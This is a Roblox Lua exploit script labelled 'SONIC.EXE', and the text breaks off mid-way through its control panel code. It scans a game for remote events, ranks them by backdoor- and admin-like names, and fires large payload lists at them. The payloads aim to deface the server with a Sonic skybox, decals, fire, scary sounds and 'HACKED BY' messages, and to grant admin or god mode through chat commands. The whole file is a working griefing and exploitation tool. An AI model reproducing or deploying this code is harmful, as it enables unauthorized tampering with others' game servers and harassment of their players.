local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")
local SoundService = game:GetService("SoundService")
local TweenService = game:GetService("TweenService")
local LocalPlayer = Players.LocalPlayer

local SONIC_IMAGE = "rbxassetid://116786398220383"
local HACK_TEXT = "HACKED BY ABiEbKEReN"
local SCARY_SOUND = "rbxassetid://1837105129"
local LAUGH_SOUND = "rbxassetid://5853747688"

local activeConnections = {}
local activePayloads = {}

local function Log(msg)
    print("[SONIC] " .. msg)
end

local function FireRemote(remote, payload)
    pcall(function()
        if remote:IsA("RemoteEvent") then
            remote:FireServer(unpack(payload))
        elseif remote:IsA("RemoteFunction") then
            remote:InvokeServer(unpack(payload))
        end
    end)
end

local function GetAllRemotes()
    local remotes = {}
    for _, obj in pairs(game:GetDescendants()) do
        pcall(function()
            if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
                table.insert(remotes, obj)
            end
        end)
    end
    return remotes
end

local function GetBackdoorRemotes()
    local found = {}
    local highPriority = {
        "backdoor", "backdoor_", "bd_", "bd-", "hidden", "secret",
        "malware", "virus", "vaccine", "cleaner", "antivirus"
    }
    local mediumPriority = {
        "admin", "admin_", "admin-", "kohl", "kohl's", "kohlsadmin",
        "hdadmin", "hd_admin", "hd-admin", "hd_admin_signalr",
        "f3x", "f3x_", "f3x-", "building", "buildtools", "build_tool",
        "btools", "command", "command_", "cmd", "cmd_", "exec", "exec_",
        "execute", "run", "run_", "loader", "load_", "init", "init_"
    }
    local lowPriority = {
        "event", "event_", "remote", "remote_", "rem", "rem_",
        "link", "link_", "data", "data_", "server", "server_",
        "main", "main_", "core", "core_", "comm", "comm_",
        "signal", "signal_", "network", "net_", "bridge", "bridge_",
        "handler", "handler_", "controller", "control_",
        "system", "sys_", "manager", "manager_",
        "gui", "gui_", "screen", "screen_", "display", "display_",
        "music", "music_", "sound", "sound_", "effect", "effect_",
        "chat", "chat_", "message", "message_", "notify", "notify_"
    }

    for _, obj in pairs(game:GetDescendants()) do
        pcall(function()
            if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
                local n = obj.Name:lower()
                local parent = obj.Parent and obj.Parent.Name:lower() or ""
                local fullName = obj:GetFullName():lower()
                local priority = nil
                local score = 0

                for _, kw in ipairs(highPriority) do
                    if n == kw or n:find(kw) then
                        score = score + 100
                        priority = "HIGH"
                        break
                    end
                end

                if not priority then
                    for _, kw in ipairs(mediumPriority) do
                        if n == kw or n:find(kw) then
                            score = score + 50
                            priority = "MED"
                            break
                        end
                    end
                end

                if not priority then
                    for _, kw in ipairs(lowPriority) do
                        if n == kw or n:find(kw) then
                            score = score + 20
                            priority = "LOW"
                            break
                        end
                    end
                end

                if score == 0 then
                    if #n <= 3 then
                        score = 30
                        priority = "SUS"
                    elseif n:find("^[%d]+$") then
                        score = 25
                        priority = "SUS"
                    elseif #n == 0 then
                        score = 40
                        priority = "SUS"
                    end
                end

                if parent:find("backdoor") or parent:find("admin") or parent:find("remote") then
                    score = score + 30
                end

                if fullName:find("serverstorage") or fullName:find("serverscriptservice") then
                    score = score + 25
                end

                if score > 0 then
                    table.insert(found, {
                        remote = obj,
                        name = obj.Name,
                        fullName = obj:GetFullName(),
                        type = obj:IsA("RemoteEvent") and "RE" or "RF",
                        score = score,
                        priority = priority or "LOW"
                    })
                end
            end
        end)
    end

    table.sort(found, function(a, b) return a.score > b.score end)
    return found
end

local function GetRemotesByPattern(pattern)
    local remotes = {}
    for _, obj in pairs(game:GetDescendants()) do
        pcall(function()
            if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
                if obj.Name:lower():find(pattern) then
                    table.insert(remotes, obj)
                end
            end
        end)
    end
    return remotes
end

local function GetLightingRemotes()
    local remotes = {}
    for _, obj in pairs(game:GetDescendants()) do
        pcall(function()
            if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
                local n = obj.Name:lower()
                local p = obj.Parent and obj.Parent.Name:lower() or ""
                if n:find("light") or n:find("sky") or n:find("atmosphere")
                    or n:find("weather") or n:find("environment")
                    or p:find("light") or p:find("sky") or p:find("environment") then
                    table.insert(remotes, obj)
            end
        end
        end)
    end
    return remotes
end

local function GetInstanceRemotes()
    local remotes = {}
    for _, obj in pairs(game:GetDescendants()) do
        pcall(function()
            if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
                local n = obj.Name:lower()
                if n:find("create") or n:find("instance") or n:find("new")
                    or n:find("spawn") or n:find("sync") or n:find("replicate")
                    or n:find("f3x") or n:find("build") or n:find("edit") then
                    table.insert(remotes, obj)
            end
        end
        end)
    end
    return remotes
end

local function GetGUIRemotes()
    local remotes = {}
    for _, obj in pairs(game:GetDescendants()) do
        pcall(function()
            if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
                local n = obj.Name:lower()
                if n:find("gui") or n:find("screen") or n:find("ui")
                    or n:find("display") or n:find("interface")
                    or n:find("notify") or n:find("message") then
                    table.insert(remotes, obj)
            end
        end
        end)
    end
    return remotes
end

local function GetSoundRemotes()
    local remotes = {}
    for _, obj in pairs(game:GetDescendants()) do
        pcall(function()
            if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
                local n = obj.Name:lower()
                if n:find("sound") or n:find("music") or n:find("audio")
                    or n:find("play") or n:find("media") then
                    table.insert(remotes, obj)
            end
        end
        end)
    end
    return remotes
end

local function GetChatRemotes()
    local remotes = {}
    for _, obj in pairs(game:GetDescendants()) do
        pcall(function()
            if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
                local n = obj.Name:lower()
                if n:find("chat") or n:find("message") or n:find("say")
                    or n:find("send") or n:find("broadcast") then
                    table.insert(remotes, obj)
            end
        end
        end)
    end
    return remotes
end

local function BuildPayloads()
    local payloads = {}

    payloads.skybox = {
        {":skybox " .. SONIC_IMAGE},
        {":sky " .. SONIC_IMAGE},
        {":setsky " .. SONIC_IMAGE},
        {"Skybox", SONIC_IMAGE},
        {"skybox", SONIC_IMAGE},
        {"sky", SONIC_IMAGE},
        {"setSky", SONIC_IMAGE},
        {"SetSky", SONIC_IMAGE},
        {"set_sky", SONIC_IMAGE},
        {"setskybox", SONIC_IMAGE},
        {"SetSkybox", SONIC_IMAGE},
        {"changeSky", SONIC_IMAGE},
        {"ChangeSky", SONIC_IMAGE},
        {"Lighting", "SkyboxBk", SONIC_IMAGE},
        {"Lighting", "Sky", SONIC_IMAGE},
        {"lighting", "sky", SONIC_IMAGE},
        {"lighting", "skybox", SONIC_IMAGE},
        {"SetProperty", "Lighting", "SkyboxBk", SONIC_IMAGE},
        {"SetProperty", game.Lighting, "SkyboxBk", SONIC_IMAGE},
        {"set_property", "Lighting", "SkyboxBk", SONIC_IMAGE},
        {"property", "Lighting", "SkyboxBk", SONIC_IMAGE},
        {"property", game.Lighting, "SkyboxBk", SONIC_IMAGE},
        {"update", "Lighting", {SkyboxBk = SONIC_IMAGE}},
        {"Update", "Lighting", {SkyboxBk = SONIC_IMAGE}},
        {"apply", "Lighting", {SkyboxBk = SONIC_IMAGE}},
        {"Apply", "Lighting", {SkyboxBk = SONIC_IMAGE}},
        {"create", "Sky", {SkyboxBk = SONIC_IMAGE, SkyboxDn = SONIC_IMAGE, SkyboxFt = SONIC_IMAGE, SkyboxLf = SONIC_IMAGE, SkyboxRt = SONIC_IMAGE, SkyboxUp = SONIC_IMAGE, Parent = game.Lighting}},
        {"Create", "Sky", {SkyboxBk = SONIC_IMAGE, Parent = game.Lighting}},
        {"new", "Sky", {SkyboxBk = SONIC_IMAGE, Parent = game.Lighting}},
        {"New", "Sky", {SkyboxBk = SONIC_IMAGE, Parent = game.Lighting}},
        {"instance", "Sky", {SkyboxBk = SONIC_IMAGE, Parent = game.Lighting}},
        {"Instance", "Sky", {SkyboxBk = SONIC_IMAGE, Parent = game.Lighting}},
        {className = "Sky", props = {SkyboxBk = SONIC_IMAGE, Parent = game.Lighting}},
        {action = "create", class = "Sky", props = {SkyboxBk = SONIC_IMAGE, Parent = game.Lighting}},
        {action = "set", obj = game.Lighting, prop = "SkyboxBk", value = SONIC_IMAGE},
        {action = "skybox", value = SONIC_IMAGE},
        {action = "sky", value = SONIC_IMAGE},
        {cmd = "skybox", args = {SONIC_IMAGE}},
        {cmd = "sky", args = {SONIC_IMAGE}},
        {command = "skybox", args = {SONIC_IMAGE}},
        {command = "sky", args = {SONIC_IMAGE}},
        {type = "admin", command = "skybox", args = {SONIC_IMAGE}},
        {action = "admin", command = "skybox", args = {SONIC_IMAGE}},
        SONIC_IMAGE,
    }

    payloads.fire = {
        {":fire all"},
        {":fire"},
        {":fire me"},
        {":fire " .. LocalPlayer.Name},
        {"fire", "all"},
        {"Fire", "all"},
        {"fire", "me"},
        {"fire", LocalPlayer.Name},
        {"Fire", LocalPlayer.Name},
        {"setFire", "all"},
        {"setFire", LocalPlayer.Name},
        {"SetFire", "all"},
        {"addFire", "all"},
        {"AddFire", "all"},
        {"add_fire", "all"},
        {"applyFire", "all"},
        {"Effect", "Fire", "all"},
        {"Effect", "Fire", LocalPlayer.Character},
        {"effect", "fire", "all"},
        {"particle", "fire", "all"},
        {"Particle", "Fire", "all"},
        {"burn", "all"},
        {"Burn", "all"},
        {"burn", LocalPlayer.Name},
        {"setOnFire", "all"},
        {"ignite", "all"},
        {"Ignite", "all"},
        {cmd = "fire", args = {"all"}},
        {cmd = "fire", args = {LocalPlayer.Name}},
        {command = "fire", args = {"all"}},
        {command = "fire", args = {LocalPlayer.Name}},
        {action = "fire", target = "all"},
        {action = "fire", target = LocalPlayer.Character},
        {type = "admin", command = "fire", args = {"all"}},
    }

    payloads.decal = {
        {":decal all " .. SONIC_IMAGE},
        {":decal " .. SONIC_IMAGE},
        {":texture all " .. SONIC_IMAGE},
        {":texture " .. SONIC_IMAGE},
        {"decal", "all", SONIC_IMAGE},
        {"Decal", "all", SONIC_IMAGE},
        {"texture", "all", SONIC_IMAGE},
        {"Texture", "all", SONIC_IMAGE},
        {"setTexture", "all", SONIC_IMAGE},
        {"SetTexture", "all", SONIC_IMAGE},
        {"set_texture", "all", SONIC_IMAGE},
        {"applyTexture", "all", SONIC_IMAGE},
        {"decal", SONIC_IMAGE},
        {"Decal", SONIC_IMAGE},
        {"texture", SONIC_IMAGE},
        {"Texture", SONIC_IMAGE},
        {SONIC_IMAGE},
        {"SetProperty", "Decal", "Texture", SONIC_IMAGE},
        {"SetProperty", "Texture", SONIC_IMAGE},
        {"set_property", "Decal", "Texture", SONIC_IMAGE},
        {"property", "Decal", "Texture", SONIC_IMAGE},
        {"paint", "all", SONIC_IMAGE},
        {"Paint", "all", SONIC_IMAGE},
        {"spray", SONIC_IMAGE},
        {"Spray", SONIC_IMAGE},
        {"replace", "texture", SONIC_IMAGE},
        {"Replace", "Texture", SONIC_IMAGE},
        {action = "set_property", target = "all", property = "Texture", value = SONIC_IMAGE},
        {action = "texture", id = SONIC_IMAGE},
        {action = "decal", id = SONIC_IMAGE},
        {action = "paint", id = SONIC_IMAGE},
        {cmd = "decal", args = {"all", SONIC_IMAGE}},
        {command = "decal", args = {"all", SONIC_IMAGE}},
        {type = "admin", command = "decal", args = {"all", SONIC_IMAGE}},
    }

    payloads.sound = {
        {":sound " .. SCARY_SOUND},
        {":playsound " .. SCARY_SOUND},
        {":music " .. SCARY_SOUND},
        {":s " .. SCARY_SOUND},
        {"playsound", SCARY_SOUND},
        {"PlaySound", SCARY_SOUND},
        {"play", SCARY_SOUND},
        {"Play", SCARY_SOUND},
        {"sound", SCARY_SOUND},
        {"Sound", SCARY_SOUND},
        {"music", SCARY_SOUND},
        {"Music", SCARY_SOUND},
        {"audio", SCARY_SOUND},
        {"Audio", SCARY_SOUND},
        {SCARY_SOUND},
        {"play", SCARY_SOUND, "all"},
        {"playMusic", SCARY_SOUND},
        {"PlayMusic", SCARY_SOUND},
        {"audio", "play", SCARY_SOUND},
        {action = "play_sound", id = SCARY_SOUND},
        {action = "sound", id = SCARY_SOUND},
        {cmd = "sound", args = {SCARY_SOUND}},
        {command = "sound", args = {SCARY_SOUND}},
    }

    payloads.message = {
        {":msg " .. HACK_TEXT},
        {":m " .. HACK_TEXT},
        {":hint " .. HACK_TEXT},
        {":h " .. HACK_TEXT},
        {":systemchat " .. HACK_TEXT},
        {":broadcast " .. HACK_TEXT},
        {":announce " .. HACK_TEXT},
        {":say " .. HACK_TEXT},
        {"msg", HACK_TEXT},
        {"Msg", HACK_TEXT},
        {"message", HACK_TEXT},
        {"Message", HACK_TEXT},
        {"hint", HACK_TEXT},
        {"Hint", HACK_TEXT},
        {"notify", HACK_TEXT},
        {"Notify", HACK_TEXT},
        {"notification", HACK_TEXT},
        {"broadcast", HACK_TEXT},
        {"Broadcast", HACK_TEXT},
        {"announce", HACK_TEXT},
        {"Announce", HACK_TEXT},
        {"say", HACK_TEXT},
        {"Say", HACK_TEXT},
        {"systemchat", HACK_TEXT},
        {"SystemChat", HACK_TEXT},
        {HACK_TEXT},
        {action = "message", text = HACK_TEXT},
        {action = "notify", text = HACK_TEXT},
        {action = "broadcast", text = HACK_TEXT},
        {cmd = "msg", args = {HACK_TEXT}},
        {command = "msg", args = {HACK_TEXT}},
        {type = "admin", command = "msg", args = {HACK_TEXT}},
    }

    payloads.particle = {
        {"particle", "fire", "all"},
        {"Particle", "fire", "all"},
        {"particles", "all"},
        {"Particles", "all"},
        {"effect", "particle", "all"},
        {"Effect", "Particle", "all"},
        {"spawnParticle", "all"},
        {"SpawnParticle", "all"},
        {"createParticle", "all"},
        {"CreateParticle", "all"},
        {action = "particle", type = "fire", target = "all"},
        {action = "spawn_particle", type = "fire", target = "all"},
        {cmd = "particle", args = {"all"}},
        {command = "particle", args = {"all"}},
    }

    return payloads
end

local function TryPayloadOnRemotes(payloadList, description)
    local remotes = GetAllRemotes()
    local fired = 0
    Log(description .. ": firing " .. #remotes .. " remotes")
    for _, remote in pairs(remotes) do
        for _, payload in ipairs(payloadList) do
            FireRemote(remote, payload)
            fired = fired + 1
            task.wait(0.02)
        end
    end
    Log(description .. ": fired " .. fired .. " payloads")
    return fired
end

local function ServerSkybox()
    local remotes = GetAllRemotes()
    local payloads = BuildPayloads()
    Log("SRV Skybox: " .. #remotes .. " remotes")
    for _, remote in pairs(remotes) do
        for _, p in ipairs(payloads.skybox) do
            FireRemote(remote, p)
            task.wait(0.02)
        end
    end
end

local function ServerFire()
    local remotes = GetAllRemotes()
    local payloads = BuildPayloads()
    Log("SRV Fire: " .. #remotes .. " remotes")
    for _, remote in pairs(remotes) do
        for _, p in ipairs(payloads.fire) do
            FireRemote(remote, p)
            task.wait(0.02)
        end
    end
end

local function ServerDecals()
    local remotes = GetAllRemotes()
    local payloads = BuildPayloads()
    Log("SRV Decals: " .. #remotes .. " remotes")
    for _, remote in pairs(remotes) do
        for _, p in ipairs(payloads.decal) do
            FireRemote(remote, p)
            task.wait(0.02)
        end
    end
end

local function ServerSound()
    local remotes = GetAllRemotes()
    local payloads = BuildPayloads()
    Log("SRV Sound: " .. #remotes .. " remotes")
    for _, remote in pairs(remotes) do
        for _, p in ipairs(payloads.sound) do
            FireRemote(remote, p)
            task.wait(0.02)
        end
    end
end

local function ServerMessage()
    local remotes = GetAllRemotes()
    local payloads = BuildPayloads()
    Log("SRV Message: " .. #remotes .. " remotes")
    for _, remote in pairs(remotes) do
        for _, p in ipairs(payloads.message) do
            FireRemote(remote, p)
            task.wait(0.02)
        end
    end
end

local function ServerParticles()
    local remotes = GetAllRemotes()
    local payloads = BuildPayloads()
    Log("SRV Particles: " .. #remotes .. " remotes")
    for _, remote in pairs(remotes) do
        for _, p in ipairs(payloads.particle) do
            FireRemote(remote, p)
            task.wait(0.02)
        end
    end
end

local function ServerFull()
    Log("═══ FULL EXPLOIT ═══")
    ServerSkybox()
    task.wait(2)
    ServerFire()
    task.wait(2)
    ServerDecals()
    task.wait(2)
    ServerSound()
    task.wait(2)
    ServerMessage()
    task.wait(2)
    ServerParticles()
    Log("═══ DONE ═══")
end

local function ServerBackdoor()
    local backdoors = GetBackdoorRemotes()
    Log("Backdoor scan: found " .. #backdoors .. " suspicious")
    for _, data in ipairs(backdoors) do
        Log("  → " .. data.priority .. " | " .. data.name .. " | " .. data.fullName)
        local payloads = BuildPayloads()
        local allCmds = {}
        for _, pList in pairs(payloads) do
            for _, p in ipairs(pList) do
                table.insert(allCmds, p)
            end
        end
        table.insert(allCmds, {":cmds"})
        table.insert(allCmds, {";cmds"})
        table.insert(allCmds, {"!cmds"})
        table.insert(allCmds, {"/e :cmds"})
        table.insert(allCmds, {"/e cmds"})

        for _, cmd in ipairs(allCmds) do
            FireRemote(data.remote, cmd)
            task.wait(0.03)
        end
    end
    Log("Backdoor exploitation done")
end

local function ServerChatBackdoor()
    Log("Chat backdoor attempt...")
    local cmds = {
        ":fire all",
        ";fire all",
        "!fire all",
        ":skybox " .. SONIC_IMAGE,
        ";skybox " .. SONIC_IMAGE,
        "!skybox " .. SONIC_IMAGE,
        ":decal all " .. SONIC_IMAGE,
        ";decal all " .. SONIC_IMAGE,
        "!decal all " .. SONIC_IMAGE,
        ":msg " .. HACK_TEXT,
        ";msg " .. HACK_TEXT,
        "!msg " .. HACK_TEXT,
        ":cmds",
        ";cmds",
        "!cmds",
        "/e :fire all",
        "/e cmds",
        "/e fire all",
        ":btools me",
        ":admin me",
        ":god me",
    }

    for _, cmd in ipairs(cmds) do
        pcall(function()
            local tcs = game:GetService("TextChatService")
            local channels = tcs:FindFirstChild("TextChannels")
            if channels then
                local general = channels:FindFirstChild("RBXGeneral")
                if general then
                    general:SendAsync(cmd)
                end
            end
        end)

        pcall(function()
            local rs = game:GetService("ReplicatedStorage")
            local chatEvents = rs:FindFirstChild("DefaultChatSystemChatEvents")
            if chatEvents then
                local sayMsg = chatEvents:FindFirstChild("SayMessageRequest")
                if sayMsg and sayMsg:IsA("RemoteEvent") then
                    sayMsg:FireServer(cmd, "All")
                end
            end
        end)

        task.wait(0.3)
    end
    Log("Chat backdoor done")
end

local function ServerInstance()
    local remotes = GetInstanceRemotes()
    Log("Instance remotes: " .. #remotes)
    local createPayloads = {
        {"create", "Sky", {SkyboxBk = SONIC_IMAGE, SkyboxDn = SONIC_IMAGE, SkyboxFt = SONIC_IMAGE, SkyboxLf = SONIC_IMAGE, SkyboxRt = SONIC_IMAGE, SkyboxUp = SONIC_IMAGE, Parent = game.Lighting}},
        {"Create", "Sky", {SkyboxBk = SONIC_IMAGE, Parent = game.Lighting}},
        {"new", "Sky", {SkyboxBk = SONIC_IMAGE, Parent = game.Lighting}},
        {"New", "Sky", {SkyboxBk = SONIC_IMAGE, Parent = game.Lighting}},
        {"instance", "Sky", {SkyboxBk = SONIC_IMAGE, Parent = game.Lighting}},
        {"Instance", "Sky", {SkyboxBk = SONIC_IMAGE, Parent = game.Lighting}},
        {"create", "Fire", "all", {Size = 10, Heat = 20}},
        {"Create", "Fire", "all", {Size = 10, Heat = 20}},
        {"create", "ParticleEmitter", "all", {Texture = SONIC_IMAGE}},
        {"Create", "ParticleEmitter", "all", {Texture = SONIC_IMAGE}},
        {"create", "Decal", "all", {Texture = SONIC_IMAGE}},
        {"Create", "Decal", "all", {Texture = SONIC_IMAGE}},
        {"create", "Sound", "all", {SoundId = SCARY_SOUND, Looped = true, Volume = 2}},
        {className = "Sky", props = {SkyboxBk = SONIC_IMAGE, Parent = game.Lighting}},
        {className = "Fire", props = {Size = 10, Heat = 20}},
        {className = "ParticleEmitter", props = {Texture = SONIC_IMAGE}},
        {action = "create", class = "Sky", props = {SkyboxBk = SONIC_IMAGE, Parent = game.Lighting}},
        {action = "create", class = "Fire", props = {Size = 10}},
        {action = "create", class = "ParticleEmitter", props = {Texture = SONIC_IMAGE}},
        {action = "create", class = "Decal", props = {Texture = SONIC_IMAGE}},
        {type = "create_instance", class = "Sky", props = {SkyboxBk = SONIC_IMAGE}},
    }

    for _, remote in pairs(remotes) do
        for _, p in ipairs(createPayloads) do
            FireRemote(remote, p)
            task.wait(0.02)
        end
    end
end
local function CheckReplication()
    local sky = Lighting:FindFirstChildOfClass("Sky")
    if sky and sky.SkyboxBk == SONIC_IMAGE then
        return true, "Sky replicated!"
    end

    local fireOnOthers = 0
    for _, plr in pairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer and plr.Character then
            local head = plr.Character:FindFirstChild("Head")
            if head and head:FindFirstChild("SonicFire") then
                fireOnOthers = fireOnOthers + 1
            end
        end
    end

    if fireOnOthers > 0 then
        return true, "Fire on " .. fireOnOthers .. " other players!"
    end

    local decalCount = 0
    for _, obj in pairs(workspace:GetDescendants()) do
        pcall(function()
            if obj:IsA("Decal") and obj.Name == "SONIC_DECAL" then
                decalCount = decalCount + 1
            end
        end)
    end

    return false, "No replication detected"
end

local function ClientSkybox()
    local old = Lighting:FindFirstChild("SonicSky")
    if old then old:Destroy() end
    local sky = Instance.new("Sky")
    sky.Name = "SonicSky"
    sky.SkyboxBk = SONIC_IMAGE
    sky.SkyboxDn = SONIC_IMAGE
    sky.SkyboxFt = SONIC_IMAGE
    sky.SkyboxLf = SONIC_IMAGE
    sky.SkyboxRt = SONIC_IMAGE
    sky.SkyboxUp = SONIC_IMAGE
    sky.SunAngularSize = 11
    sky.MoonAngularSize = 11
    sky.StarCount = 3000
    sky.Parent = Lighting
end

local function ClientFire()
    for _, plr in pairs(Players:GetPlayers()) do
        pcall(function()
            if plr.Character then
                local head = plr.Character:FindFirstChild("Head")
                if head and not head:FindFirstChild("SonicFire") then
                    local fire = Instance.new("Fire")
                    fire.Name = "SonicFire"
                    fire.Size = 10
                    fire.Heat = 20
                    fire.Color = Color3.new(1, 0.2, 0)
                    fire.SecondaryColor = Color3.new(0.5, 0, 0)
                    fire.Parent = head
                end
            end
        end)
    end
end

local function ClientParticles()
    local function AddParticlesToChar(char)
        pcall(function()
            local head = char:FindFirstChild("Head")
            if head and not head:FindFirstChild("SonicParticles") then
                local attachment = Instance.new("Attachment")
                attachment.Name = "SonicAttachment"
                attachment.Parent = head


local particles = Instance.new("ParticleEmitter")
                particles.Name = "SonicParticles"
                particles.Texture = SONIC_IMAGE
                particles.Rate = 30
                particles.Lifetime = NumberRange.new(2, 4)
                particles.Speed = NumberRange.new(5, 12)
                particles.SpreadAngle = Vector2.new(360, 360)
                particles.Rotation = NumberRange.new(0, 360)
                particles.RotSpeed = NumberRange.new(-180, 180)
                particles.Size = NumberSequence.new({
                    NumberSequenceKeypoint.new(0, 1.5),
                    NumberSequenceKeypoint.new(1, 0.5)
                })
                particles.Transparency = NumberSequence.new({
                    NumberSequenceKeypoint.new(0, 0.2),
                    NumberSequenceKeypoint.new(1, 1)
                })
                particles.Color = ColorSequence.new(Color3.new(1, 0.2, 0))
                particles.LightEmission = 0.5
                particles.LightInfluence = 0
                particles.Acceleration = Vector3.new(0, 5, 0)
                particles.Drag = 1
                particles.Enabled = true
                particles.Parent = attachment

                local trail = Instance.new("Trail")
                trail.Name = "SonicTrail"
                trail.Attachment0 = attachment
                trail.Lifetime = 0.5
                trail.Color = ColorSequence.new(Color3.new(1, 0, 0))
                trail.Transparency = NumberSequence.new({
                    NumberSequenceKeypoint.new(0, 0.3),
                    NumberSequenceKeypoint.new(1, 1)
                })
                trail.LightEmission = 0.5
                trail.Parent = head

                task.spawn(function()
                    task.wait(2)
                    pcall(function()
                        local emit = Instance.new("ParticleEmitter")
                        emit.Name = "SonicSpread"
                        emit.Texture = SONIC_IMAGE
                        emit.Rate = 10
                        emit.Lifetime = NumberRange.new(3, 6)
                        emit.Speed = NumberRange.new(10, 25)
                        emit.SpreadAngle = Vector2.new(360, 360)
                        emit.Size = NumberSequence.new({
                            NumberSequenceKeypoint.new(0, 2),
                            NumberSequenceKeypoint.new(1, 0.5)
                        })
                        emit.Transparency = NumberSequence.new({
                            NumberSequenceKeypoint.new(0, 0.3),
                            NumberSequenceKeypoint.new(1, 1)
                        })
                        emit.Acceleration = Vector3.new(0, 10, 0)
                        emit.Drag = 0.5
                        emit.Enabled = true
                        emit.Parent = attachment
                    end)
                end)
            end
        end)
    end

    for _, plr in pairs(Players:GetPlayers()) do
        if plr.Character then
            AddParticlesToChar(plr.Character)
        end
    end

    Players.PlayerAdded:Connect(function(plr)
        plr.CharacterAdded:Connect(function(char)
            task.wait(1)
            AddParticlesToChar(char)
        end)
    end)
end

local function ClientDecals()
    local count = 0
    for _, obj in pairs(workspace:GetDescendants()) do
        pcall(function()
            if obj:IsA("BasePart") then
                local faces = {
                    Enum.NormalId.Front,
                    Enum.NormalId.Back,
                    Enum.NormalId.Left,
                    Enum.NormalId.Right,
                    Enum.NormalId.Top,
                    Enum.NormalId.Bottom
                }
                for _, face in ipairs(faces) do
                    local decal = Instance.new("Decal")
                    decal.Name = "SONIC_DECAL"
                    decal.Texture = SONIC_IMAGE
                    decal.Face = face
                    decal.Parent = obj
                    count = count + 1
                end
            end
        end)
    end
    Log("Decals: " .. count)
end

local function ClientSound()
    local s = Instance.new("Sound")
    s.Name = "SonicScary"
    s.SoundId = SCARY_SOUND
    s.Volume = 2
    s.Looped = true
    s.Parent = SoundService
    s:Play()

    task.spawn(function()
        while true do
            task.wait(math.random(8, 20))
            pcall(function()
                local l = Instance.new("Sound")
                l.SoundId = LAUGH_SOUND
                l.Volume = 3
                l.PlaybackSpeed = math.random(7, 13) / 10
                l.Parent = workspace
                l:Play()
                game:GetService("Debris"):AddItem(l, 5)
            end)
        end
    end)
end

local function ClientMessage()
    local gui = Instance.new("ScreenGui")
    gui.Name = "SONIC_MSG"
    gui.ResetOnSpawn = false
    gui.IgnoreGuiInset = true
    gui.Parent = LocalPlayer:WaitForChild("PlayerGui")

    local txt = Instance.new("TextLabel")
    txt.Size = UDim2.new(1, 0, 0.1, 0)
    txt.Position = UDim2.new(0, 0, 0.02, 0)
    txt.BackgroundTransparency = 1
    txt.Text = HACK_TEXT
    txt.TextColor3 = Color3.new(1, 0, 0)
    txt.TextScaled = true
    txt.Font = Enum.Font.SourceSansBold
    txt.TextStrokeTransparency = 0
    txt.Parent = gui

    local txt2 = Instance.new("TextLabel")
    txt2.Size = UDim2.new(1, 0, 0.08, 0)
    txt2.Position = UDim2.new(0, 0, 0.13, 0)
    txt2.BackgroundTransparency = 1
    txt2.Text = HACK_TEXT
    txt2.TextColor3 = Color3.new(1, 0.5, 0)
    txt2.TextScaled = true
    txt2.Font = Enum.Font.SourceSansBold
    txt2.TextStrokeTransparency = 0
    txt2.Parent = gui
end

local function ClientFull()
    ClientSkybox()
    ClientFire()
    ClientParticles()
    ClientDecals()
    ClientSound()
    ClientMessage()
end

local function ClearAll()
    Log("Clearing...")

    local sky = Lighting:FindFirstChild("SonicSky")
    if sky then sky:Destroy() end

    for _, plr in pairs(Players:GetPlayers()) do
        pcall(function()
            if plr.Character then
                local head = plr.Character:FindFirstChild("Head")
                if head then
                    local fire = head:FindFirstChild("SonicFire")
                    if fire then fire:Destroy() end
                    local attach = head:FindFirstChild("SonicAttachment")
                    if attach then attach:Destroy() end
                end
            end
        end)
    end

    for _, obj in pairs(workspace:GetDescendants()) do
        pcall(function()
            if obj:IsA("Decal") and obj.Name == "SONIC_DECAL" then
                obj:Destroy()
            end
        end)
    end

    for _, obj in pairs(SoundService:GetChildren()) do
        if obj.Name == "SonicScary" or obj.Name == "SonicLaugh" then
            obj:Destroy()
        end
    end

    for _, obj in pairs(workspace:GetChildren()) do
        if obj:IsA("Sound") then
            obj:Destroy()
        end
    end

    for _, obj in pairs(Lighting:GetChildren()) do
        if obj.Name == "SonicCC" or obj:IsA("Atmosphere") then
            obj:Destroy()
        end
    end

    local pg = LocalPlayer:FindFirstChild("PlayerGui")
    if pg then
        for _, obj in pairs(pg:GetChildren()) do
            if obj.Name:find("SONIC") then
                obj:Destroy()
            end
        end
    end

    for _, conn in pairs(activeConnections) do
        pcall(function() conn:Disconnect() end)
    end
    activeConnections = {}

    Log("Cleared")
end

local function BuildPanel()
    local panel = Instance.new("ScreenGui")
    panel.Name = "SONIC_PANEL"
    panel.ResetOnSpawn = false
    panel.Parent = LocalPlayer:WaitForChild("PlayerGui")

local main = Instance.new("Frame")
    main.Size = UDim2.new(0, 190, 0, 280)
    main.Position = UDim2.new(0.72, 0, 0.08, 0)
    main.BackgroundColor3 = Color3.fromRGB(5, 5, 5)
    main.BorderSizePixel = 0
    main.Active = true
    main.Draggable = true
    main.Parent = panel

    local mc = Instance.new("UICorner")
    mc.CornerRadius = UDim.new(0, 6)
    mc.Parent = main

    local titleBar = Instance.new("Frame")
    titleBar.Size = UDim2.new(1, 0, 0, 26)
    titleBar.BackgroundColor3 = Color3.fromRGB(15, 5, 5)
    titleBar.BorderSizePixel = 0
    titleBar.Parent = main

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, -50, 1, 0)
    title.Position = UDim2.new(0, 8, 0, 0)
    title.BackgroundTransparency = 1
    title.Text = "SONIC.EXE"
    title.TextColor3 = Color3.fromRGB(255, 30, 30)
    title.TextSize = 12
    title.Font = Enum.Font.SourceSansBold
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.Parent = titleBar

    local closeBtn = Instance.new("TextButton")
    closeBtn.Size = UDim2.new(0, 20, 1, 0)
    closeBtn.Position = UDim2.new(1, -24, 0, 0)
    closeBtn.BackgroundTransparency = 1
    closeBtn.Text = "—"
    closeBtn.TextColor3 = Color3.fromRGB(150, 0, 0)
    closeBtn.TextSize = 14
    closeBtn.Font = Enum.Font.SourceSansBold
    closeBtn.Parent = titleBar

    local container = Instance.new("ScrollingFrame")
    container.Size = UDim2.new(1, -4, 1, -30)
    container.Position = UDim2.new(0, 2, 0, 28)
    container.BackgroundTransparency = 1
    container.BorderSizePixel = 0
    container.ScrollBarThickness = 3
